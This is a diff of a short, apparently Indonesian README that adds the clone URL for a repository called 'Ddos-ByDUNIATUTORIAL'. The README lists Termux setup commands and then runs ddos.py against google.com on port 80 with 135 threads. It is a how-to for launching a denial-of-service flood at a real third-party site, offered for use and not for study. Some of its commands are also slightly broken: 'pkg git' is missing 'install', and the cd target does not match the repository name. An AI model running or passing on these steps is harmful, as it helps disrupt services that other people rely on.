@@ -6,7 +6,7 @@ kode perintah
 pkg update && pkg upgrade
 pkg git 
 pkg python2
-git clone 
+git clone https://github.com/Wahyuoktafian/Ddos-ByDUNIATUTORIAL
 cd ddos2
 python2 ddos.py -s google.com -p 80 -t 135 
 
